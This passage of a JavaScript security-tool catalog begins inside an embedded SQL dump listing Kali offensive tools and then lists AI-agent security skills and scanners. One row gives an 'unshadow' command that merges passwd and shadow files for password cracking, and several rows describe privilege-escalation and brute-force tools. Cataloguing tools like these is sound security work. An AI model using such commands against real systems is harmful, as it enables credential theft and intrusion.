objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database', 'https://tools.kali.org/information-gathering/theharvester', NULL, 'N/A', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('jSQLInjection', 'Enum', 'used for gathering SQL databse information form a distant source', 'https://tools.kali.org/vulnerability-analysis/jsql', 'SQLi', 'SQL', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hping', 'Enum', 'Ping command on steroids, used to enumerating firewalls', 'https://tools.kali.org/information-gathering/hping3', 'Scanning', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux Exploit Suggester', 'Post', 'keeps track of vulnerabilities and suggests exploits to gain root access', 'https://tools.kali.org/exploitation-tools/linux-exploit-suggester', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unix-PrivEsc-Check', 'Post', ' It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps, written in a single shell script so is easy to upload', 'https://tools.kali.org/vulnerability-analysis/unix-privesc-check', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Dotdotpwn', 'Enum', 'It’s a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers', 'https://tools.kali.org/information-gathering/dotdotpwn', 'Fuzzing', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Websploit', 'Enum, Exploit', 'Swiss-army-knife of web exploits ranging from social engineering to honeypots and everything in between', 'https://tools.kali.org/web-applications/websploit', NULL, 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('XSSer', 'Enum', 'To detect, exploit and report XSS vulnerabilities in web-based applications', 'https://tools.kali.org/web-applications/xsser', 'Exploit enum', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Name-That-Hash', 'Utility', 'Hash-identifier with more deatils and command line based', 'https://github.com/HashPals/Name-That-Hash', NULL, 'N/A', 'N', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBMap', 'Enum', 'enumerate shares over a domin', 'https://tools.kali.org/information-gathering/smbmap', 'Scanning', 'OS', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Redis-Cli', 'Exploit', 'used for interacting and exploiting reddis-cli on port 6379', 'https://book.hacktricks.xyz/pentesting/6379-pentesting-redis ; https://redis.io/topics/rediscli', 'SQL', 'SQL', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unshadow', 'POST', 'Combining passwd and shadow files into 1', 'simply use: unshadow <passwd file> <shadow file> > <output file>', 'Passwords', 'Hash', 'Y', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WPScan', 'Enum', 'Look for vulnerabilities in wordpress site', 'https://github.com/wpscanteam/wpscan', 'Scanning', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Netcat', 'Utility', 'used for connecting 2 computers', 'https://www.win.tue.nl/~aeb/linux/hh/netcat_tutorial.pdf', 'Connect', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux commands', 'Post', 'Linux commands used for Priv esc', 'https://gtfobins.github.io, https://wadcoms.github.io', 'Priv Esc', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CrackMapExec', 'Enum,, Exploit', 'Swis army knife of network testing', 'https://ptestmethod.readthedocs.io/en/latest/cme.html', 'Scanning, Exploit', 'Networks', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('IKE-Scan', 'Enum', 'Used to dicover, fingerprint and test IPsec VPN systems', 'http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide', 'Scanning', 'VPN', NULL, NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PSK-Crack', 'Exploit', 'attempts to crack IKE Aggressive Mode pre-shared keys that have previously been gathered using ike-scan with the --pskcrack option', 'https://linux.die.net/man/1/psk-crack', 'Connect, Brute', 'Wifi', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CeWL', 'Enum', 'spiders a given url returning a wordlist that is intednded for cracking passwords', 'https://tools.kali.org/password-attacks/cewl', 'Brute', 'Web', 'Y', NULL);  COMMIT TRANSACTION; PRAGMA foreign_keys = on;"
    },
    {
      name: "pipelock",
      url: "https://github.com/luckyPipewrench/pipelock",
      tags: ["MCP"],
      target: ["binary", "agent"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Firewall for AI agents. DLP scanning, SSRF protection, bidirectional MCP scanning, tool poisoning detection, and prompt injection blocking"
    },
    {
      name: "agent-threat-rules",
      url: "https://github.com/Agent-Threat-Rule/agent-threat-rules",
      tags: ["MCP"],
      target: ["web", "binary", "agent"],
      technique: ["compliance"],
      form: ["prompt-skill"],
      desc: "Open detection standard for AI agent threats. Like Sigma, but for prompt injection, tool poisoning, and MCP attacks. Community-driven -- contributions welcome"
    },
    {
      name: "pydantic-ai-shields",
      url: "https://github.com/vstorm-co/pydantic-ai-shields",
      tags: ["CC"],
      target: ["web", "binary", "agent"],
      technique: ["reverse-engineering", "exploit-dev"],
      form: ["prompt-skill"],
      desc: "Guardrail capabilities for Pydantic AI — cost tracking, prompt injection detection, PII filtering, secret redaction, tool permissions, and async guardrails. Built on pydantic-ai's native capabilities API"
    },
    {
      name: "Mithra-Scanner",
      url: "https://github.com/KadirArslan/Mithra-Scanner",
      tags: ["CC"],
      target: ["web", "agent"],
      technique: ["static-analysis", "dynamic-testing", "compliance"],
      form: ["tool-wrapper"],
      desc: "Mithra Scanner is an interactive API testing tool for prompt injection, refusal detection, and LLM security benchmarking. It supports YAML-based rule definitions, custom refusal lists, REST API integration, and provides detailed CLI output for security testing of language model endpoints"
    },
    {
      name: "aguara",
      url: "https://github.com/garagon/aguara",
      tags: ["CC", "MCP"],
      target: ["binary", "agent", "source"],
      technique: ["static-analysis"],
      form: ["mcp-server"],
      desc: "Security scanner for AI agent skills and MCP servers. Static analysis, incident response, no LLM. One binary.   Detection engine behind oktsec"
    },

    // ── Added by crawler 2026-04-15 ──
    {
      name: "wxmini-security-audit",
      url: "https://github.com/sssmmmwww/wxmini-security-audit",
      tags: ["CC"],
      target: ["web", "agent"],
      technique: ["static-analysis"],
      desc: "Automated WeChat mini-program security audit skill based on Claude Code Agent Teams. 7-agent collaboration covering sensitive info detection, API interfaces, crypto analysis, and vulnerability analysis. Script+LLM dual-layer architecture: scripts ensure coverage, LLM ensures accuracy.",
      form: ["prompt-skill"],
    },
    {
      name: "claude-wordpress-skills",
      url: "https://github.com/elvismdev/claude-wordpress-skills",
      tags: ["CC"],
      target: ["binary", "agent"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Professional WordPress engineering skills for Claude Code - performance optimization, security auditing, Gutenberg block development, and theme/plugin best practices"
    },
    {
      name: "supabase-pentest-skills",
      url: "https://github.com/yoanbernabeu/supabase-pentest-skills",
      tags: ["CC"],
      target: ["web", "binary", "agent"],
      technique: ["dynamic-testing"],
      form: ["prompt-skill"],
      desc: "24 AI Agent Skills for professional security auditing of Supabase applications. Detection, key extraction, RLS testing, storage audit, IDOR detection, and comprehensive reporting. Works with Claude Code, Cursor, Windsurf, and 30+ AI agents"
    },
    {
      name: "skill-audit",
      url: "https://github.com/dabit3/skill-audit",
      tags: ["CC"],
      target: ["binary", "agent"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Audit agent skill definitions for security, completeness, and compatibility across Codex, Claude Code, OpenClaw, and more"
    },

    // ── Threat Modeling & Audit ──────────────────────────────────────
    {
      name: "GitHub Security Lab taskflow-agent",
      url: "https://github.com/GitHubSecurityLab/seclab-taskflow-agent",
      tags: ["OAI", "MCP"],
      target: ["source", "general"],
      technique: ["threat-modeling", "static-analysis"],
      form: ["workflow"],
      desc: "3-stage audit pipeline: threat modeling, vulnerability suggestion, and independent verification."
    },
    {
      name: "GitHub Security Lab taskflows",
      url: "https://github.com/GitHubSecurityLab/seclab-taskflows",
      tags: ["OAI"],
      target: ["source", "general"],
      technique: ["threat-modeling"],
      form: ["workflow"],
      desc: "Declarative YAML taskflow definitions for GitHub Security Lab's audit agent workflow."
    },
    {
      name: "OpenAI security-threat-model",
      url: "https://github.com/openai/skills/tree/main/skills/.curated/security-threat-model",
      tags: ["CX"],
      target: ["general"],
      technique: ["threat-modeling"],
      form: ["prompt-skill"],
      desc: "STRIDE-based architecture-level threat modeling skill for Codex-style workflows."
    },

    // ── Static Analysis & Code Review ────────────────────────────────
    {
      name: "Trail of Bits Skills",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["source", "binary"],
      technique: ["static-analysis", "compliance"],
      form: ["prompt-skill"],
      desc: "18+ security skills including static analysis, variant analysis, differential review, insecure defaults, constant-time analysis, audit context building, and more."
    },
    {
      name: "Ghost Security Skills",
      url: "https://github.com/ghostsecurity/skills",
      tags: ["CC"],
      target: ["source", "web"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "AI-native application security skills focused on practical AppSec workflows."
    },
    {
      name: "Anthropic Security Review",
      url: "https://github.com/anthropics/claude-code-security-review",
      tags: ["CC"],
      target: ["source"],
      technique: ["static-analysis"],
      form: ["workflow"],
      desc: "Official GitHub Action for PR security review with false-positive filtering."
    },
    {
      name: "afiqiqmal/claude-security-audit",
      url: "https://github.com/afiqiqmal/claude-security-audit",
      tags: ["CC"],
      target: ["source", "web"],
      technique: ["static-analysis", "compliance"],
      form: ["workflow"],
      desc: "5-phase audit flow with 475+ checks, OWASP 2025 coverage, compliance mappings, and framework-specific rules."
    },
    {
      name: "claude-code-owasp",
      url: "https://github.com/agamm/claude-code-owasp",
      tags: ["CC"],
      target: ["source", "web"],
      technique: ["static-analysis", "compliance"],
      form: ["knowledge-base"],
      desc: "OWASP Top 10:2025 + ASVS 5.0 + agentic AI security review guidance across 20+ languages."
    },
    {
      name: "vibesec",
      url: "https://github.com/BehiSecc/vibesec",
      tags: ["CC"],
      target: ["web"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Bug hunter-oriented secure coding assistant focused on IDOR, XSS, SQLi, SSRF, and similar flaws."
    },
    {
      name: "clawsec",
      url: "https://github.com/prompt-security/clawsec",
      tags: ["CC"],
      target: ["agent"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Security drift detection, automatic auditing, and skill integrity verification."
    },
    {
      name: "perseus",
      url: "https://github.com/kaivyy/perseus",
      tags: ["CC", "CX"],
      target: ["source"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Multi-language security assessment for JS, Go, Python, Rust, Java, and PHP."
    },
    {
      name: "NeoLab code-review",
      url: "https://github.com/NeoLabHQ",
      tags: ["CC"],
      target: ["source"],
      technique: ["static-analysis"],
      form: ["agent-framework"],
      desc: "6 parallel specialist agents covering bug hunting, security auditing, code quality, contracts, tests, and history."
    },
    {
      name: "wrsmith108/security-auditor",
      url: "https://github.com/wrsmith108/claude-skill-security-auditor",
      tags: ["CC"],
      target: ["supply-chain"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "npm dependency audit wrapper with exception management support."
    },

    // ── Security Operations & Workflow Suites ────────────────────────
    {
      name: "SecOpsAgentKit",
      url: "https://github.com/AgentSecOps/SecOpsAgentKit",
      tags: ["CC"],
      target: ["source", "container", "supply-chain"],
      technique: ["static-analysis"],
      form: ["suite"],
      desc: "25+ SecOps skills for vulnerability discovery, container scanning, secrets detection, and policy enforcement."
    },
    {
      name: "claude-forge",
      url: "https://github.com/sangrokjung/claude-forge",
      tags: ["CC"],
      target: ["general"],
      technique: ["static-analysis"],
      form: ["suite"],
      desc: "Security-conscious Claude setup with 11 agents, 36 commands, 15 skills, and layered hooks."
    },
    {
      name: "everything-claude-code",
      url: "https://github.com/affaan-m/everything-claude-code",
      tags: ["CC"],
      target: ["general"],
      technique: ["static-analysis"],
      form: ["suite"],
      desc: "Performance-optimized Claude Code setup with security-focused skills, instincts, and memory."
    },
    {
      name: "graphify",
      url: "https://github.com/safishamsi/graphify",
      tags: ["CC", "CX", "OC"],
      target: ["source", "general"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "Convert code and docs into queryable knowledge graphs for audit assistance."
    },

    // ── Offensive Security, Pentest & CTF ────────────────────────────
    {
      name: "awesome-claude-skills-security",
      url: "https://github.com/Eyadkelleh/awesome-claude-skills-security",
      tags: ["CC"],
      target: ["web", "general"],
      technique: ["dynamic-testing", "fuzzing", "exploit-dev"],
      form: ["prompt-skill"],
      desc: "Security-oriented Claude skills collection with dedicated pentest, CTF, and bug bounty agents."
    },
    {
      name: "bug-hunter",
      url: "https://github.com/codexstar69/bug-hunter",
      tags: ["CC", "CX"],
      target: ["web", "general"],
      technique: ["dynamic-testing", "exploit-dev"],
      form: ["prompt-skill"],
      desc: "Adversarial AI bug hunter targeting offensive security and bug bounty workflows."
    },
    {
      name: "raptor",
      url: "https://github.com/gadievron/raptor",
      tags: ["CC"],
      target: ["general"],
      technique: ["static-analysis", "dynamic-testing"],
      form: ["prompt-skill"],
      desc: "General-purpose security agent spanning both offensive and defensive work."
    },
    {
      name: "communitytools",
      url: "https://github.com/transilienceai/communitytools",
      tags: ["CC"],
      target: ["web", "general"],
      technique: ["dynamic-testing", "recon"],
      form: ["prompt-skill"],
      desc: "Pentest skills and slash commands tuned for bug bounty research."
    },
    {
      name: "Strix",
      url: "https://github.com/usestrix/strix",
      tags: ["TOOL"],
      target: ["web"],
      technique: ["dynamic-testing"],
      form: ["agent-framework"],
      desc: "Autonomous AI pentester in a Docker sandbox with Caido proxy, headless browser, multi-agent orchestration, and PoC-focused reporting."
    },
    {
      name: "hexstrike-ai",
      url: "https://github.com/0x4m4/hexstrike-ai",
      tags: ["MCP"],
      target: ["general"],
      technique: ["dynamic-testing", "recon"],
      form: ["mcp-server"],
      desc: "MCP server exposing 150+ Kali Linux pentest tools to AI agents."
    },
    {
      name: "ctf-skills",
      url: "https://github.com/ljagiello/ctf-skills",
      tags: ["CC", "CX"],
      target: ["web", "binary"],
      technique: ["reverse-engineering", "exploit-dev", "recon"],
      form: ["prompt-skill"],
      desc: "CTF-oriented skills for web, pwn, crypto, reverse, forensics, OSINT, malware, and more."
    },

    // ── Fuzzing ──────────────────────────────────────────────────────
    {
      name: "Trail of Bits testing-handbook-skills",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["source"],
      technique: ["fuzzing", "static-analysis"],
      form: ["prompt-skill"],
      desc: "Fuzzer, static analysis, and sanitizer integration guidance from Trail of Bits."
    },
    // ── Reverse Engineering & Binary Analysis ────────────────────────
    {
      name: "P4nda0s/reverse-skills",
      url: "https://github.com/P4nda0s/reverse-skills",
      tags: ["CC"],
      target: ["binary", "mobile"],
      technique: ["reverse-engineering"],
      form: ["prompt-skill"],
      desc: "7 reverse engineering skills for symbol recovery, struct reconstruction, Frida instrumentation, Unicorn emulation, DEX dumping, Unity IL2CPP extraction, and IDAPython scripting."
    },
    {
      name: "Trail of Bits dwarf-expert",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["binary"],
      technique: ["reverse-engineering"],
      form: ["knowledge-base"],
      desc: "DWARF debug format expertise for binary analysis workflows."
    },
    {
      name: "Trail of Bits firebase-apk-scanner",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["mobile"],
      technique: ["static-analysis"],
      form: ["workflow"],
      desc: "Android APK scanning workflow for Firebase misconfiguration discovery."
    },
    {
      name: "Trail of Bits burpsuite-project-parser",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["web"],
      technique: ["reverse-engineering"],
      form: ["tool-wrapper"],
      desc: "Search and extract data from Burp Suite project files."
    },

    // ── Smart Contract Security ──────────────────────────────────────
    {
      name: "Trail of Bits building-secure-contracts",
      url: "https://github.com/trailofbits/skills/tree/main/plugins/building-secure-contracts",
      tags: ["CC", "CX"],
      target: ["smart-contract"],
      technique: ["static-analysis", "compliance"],
      form: ["prompt-skill"],
      desc: "6-chain scanner plus audit prep and maturity assessment for smart contract projects."
    },
    {
      name: "Trail of Bits entry-point-analyzer",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["smart-contract"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Identify state-changing entry points in smart contracts."
    },
    {
      name: "Trail of Bits spec-to-code-compliance",
      url: "https://github.com/trailofbits/skills",
      tags: ["CC", "CX"],
      target: ["smart-contract"],
      technique: ["compliance"],
      form: ["prompt-skill"],
      desc: "Specification-to-code compliance checking for blockchain audits."
    },
    {
      name: "scv-scan",
      url: "https://github.com/kadenzipfel/scv-scan",
      tags: ["CC"],
      target: ["smart-contract"],
      technique: ["static-analysis"],
      form: ["prompt-skill"],
      desc: "Solidity vulnerability scanner covering 36 vulnerability classes."
    },

    // ── Skill & Agent Security ───────────────────────────────────────
    {
      name: "Cisco skill-scanner",
      url: "https://github.com/cisco-ai-defense/skill-scanner",
      tags: ["TOOL"],
      target: ["agent"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "Multi-engine skill scanning using YAML/YARA rules, AST behavior analysis, semantic review, and VirusTotal."
    },
    {
      name: "Snyk agent-scan",
      url: "https://github.com/snyk/agent-scan",
      tags: ["TOOL"],
      target: ["agent"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "Scan MCP servers and agent skills for prompt injection, tool poisoning, and data exfiltration risk."
    },
    {
      name: "pors/skill-audit",
      url: "https://github.com/pors/skill-audit",
      tags: ["TOOL"],
      target: ["agent"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "CLI scanner for prompt injection, secret leakage, and dangerous patterns with SARIF output."
    },
    {
      name: "huifer/skill-security-scan",
      url: "https://github.com/huifer/skill-security-scan",
      tags: ["TOOL"],
      target: ["agent"],
      technique: ["static-analysis"],
      form: ["tool-wrapper"],
      desc: "Bilingual Claude Skills scanner with static analysis, rule engine, and HTML reporting."
    },

    // ── Knowledge Bases & Research ───────────────────────────────────
    {
      name: "mukul975/Anthropic-Cybersecurity-Skills",
      url: "https://github.com/mukul975/Anthropic-Cybersecurity-Skills",
      tags: ["CC", "OC"],
      target: ["general"],
      technique: ["static-analysis"],
      form: ["knowledge-base"],
      desc: "754 structured skills across 38 security domains aligned with MITRE ATT&CK and NIST CSF 2.0."
    },
    {
      name: "Skills-4-SE Security Scanner Suite",
      url: "https://github.com/ArabelaTso/Skills-4-SE/tree/main/skill-packs/security-scanner-suite",
      tags: ["CC"],
      target: ["source"],
      technique: ["static-analysis"],
      form: ["knowledge-base"],
      desc: "13 security skills spanning static vuln detection, root cause analysis, exploitability assessment, CVE reachability, taint instrumentation, and patch advice."
    },
    {
      name: "Skills-4-SE Formal Verification Toolkit",
      url: "https://github.com/ArabelaTso/Skills-4-SE/tree/main/skill-packs/formal-verification-toolkit",
      tags: ["CC"],
      target: ["source"],
      technique: ["static-analysis"],
      form: ["knowledge-base"],
      desc: "17 formal verification skills for model checking, contract verification, and invariant analysis."
    },
    {
      name: "ArabelaTso/Skills-4-SE",
      url: "https://github.com/ArabelaTso/Skills-4-SE",
      tags: [],
      target: ["source", "general"],
      technique: ["static-analysis"],
      form: ["knowledge-base"],
      desc: "180+ software engineering skills across the lifecycle, including security scanner and formal verification packs."
    },
    {
      name: "huhusmang/Awesome-LLMs-for-Vulnerability-Detection",
      url: "https://github.com/huhusmang/Awesome-LLMs-for-Vulnerability-Detection",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["knowledge-base"],
      desc: "Paper collection focused on LLMs for vulnerability detection."
    },

    // ── Indexes, Marketplaces & Discovery ────────────────────────────
    {
      name: "VoltAgent/awesome-agent-skills",
      url: "https://github.com/VoltAgent/awesome-agent-skills",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "500+ agent skills with strong security coverage."
    },
    {
      name: "antigravity-awesome-skills",
      url: "https://github.com/sickn33/antigravity-awesome-skills",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "1,370+ installable agentic skills with a rich security category."
    },
    {
      name: "travisvn/awesome-claude-skills",
      url: "https://github.com/travisvn/awesome-claude-skills",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "Curated Claude Skills index with security-relevant entries."
    },
    {
      name: "hesreallyhim/awesome-claude-code",
      url: "https://github.com/hesreallyhim/awesome-claude-code",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "Claude Code resource collection spanning skills, hooks, and slash commands."
    },
    {
      name: "BehiSecc/awesome-claude-skills",
      url: "https://github.com/BehiSecc/awesome-claude-skills",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "Security-focused Claude Skills curation."
    },
    {
      name: "ComposioHQ/awesome-claude-skills",
      url: "https://github.com/ComposioHQ/awesome-claude-skills",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "Another broad Claude Skills curated list."
    },
    {
      name: "ottosulin/awesome-ai-security",
      url: "https://github.com/ottosulin/awesome-ai-security",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "AI security resource collection with an agent-skills category."
    },
    {
      name: "alirezarezvani/claude-skills",
      url: "https://github.com/alirezarezvani/claude-skills",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "220+ Claude Code skills and agent plugins."
    },
    {
      name: "aiskillstore/marketplace",
      url: "https://github.com/aiskillstore/marketplace",
      tags: [],
      target: ["general"],
      technique: [],
      form: ["catalog"],
      desc: "Security-audited Claude and Codex skills marketplace."
    }
  ]
};
